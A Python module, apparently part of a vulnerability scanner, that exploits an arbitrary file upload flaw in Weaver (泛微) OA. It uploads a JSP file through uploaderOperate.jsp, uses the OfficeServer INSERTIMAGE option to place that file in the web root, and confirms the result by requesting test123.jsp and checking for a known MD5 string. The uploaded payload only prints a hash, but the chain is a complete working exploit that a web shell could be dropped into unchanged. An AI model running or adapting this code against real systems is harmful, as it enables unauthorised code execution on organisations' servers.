import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import re

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'Referer': url1
        }
        filec = '''<%@ page textType="text/html; charset=GBK"%>
        <%@page import="java.math.BigInteger"%>
        <%@page import="java.security.MessageDigest"%>
        <%

        MessageDigest md5 = null;
        md5 = MessageDigest.getInstance("MD5");
        String s = "123";
        String miyao = "abc";
        String jiamichuan = s + miyao;
        md5.update(jiamichuan.getBytes());
        String md5String = new BigInteger(1, md5.digest()).toString(16);
        out.println(md5String);

        %>'''
        path = 'workrelate/plan/util/uploaderOperate.jsp'
        files = {'secId': ("", "1", ""),
                 'Filedata': ("test123.jsp", filec, ""),
                 'plandetailid': ("", "1", "")
                 }
        logging.captureWarnings(True)
        aa1 = requests.post(url1 + path, cookies=s_cookie,files = files,headers=headers, proxies=proxies,verify=False, timeout=10)
        if  aa1.status_code == 200 and "test123.jsp" in aa1.text and 'btn_wh' in aa1.text:
            try:
                fileid = re.findall(r'''href='/workrelate/plan/util/ViewDoc\.jsp\?id=\d+?&plandetailid=1&fileid=(.*?)'>''',aa1.text)[0]
                path2 = 'OfficeServer'
                files1 = {'111': ("", "{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'" + fileid + "'}", "")}
                aa2 = requests.post(url1 + path2, cookies=s_cookie, files=files1, headers=headers, proxies=proxies,verify=False, timeout=10)
                if aa2.status_code == 200 and filec in aa2.text:
                    aa3 = requests.get(url1 + 'test123.jsp', cookies=s_cookie, headers=headers, proxies=proxies,verify=False, timeout=10)
                    if aa3.status_code == 200 and 'a906449d5769fa7361d7ecc6aa3f6d28' in aa3.text:
                        cdd = '[+]漏洞存在\n' + str(aa3.text)
                    else:
                        cdd = '[+]漏洞不存在_2\n'
                else:
                    cdd = '[-]漏洞不存在_1\n'
            except:
                cdd = '链接获取错误'
        else:
            cdd='[-]漏洞不存在\n'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 泛微 uploaderOperate.jsp文件上传 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)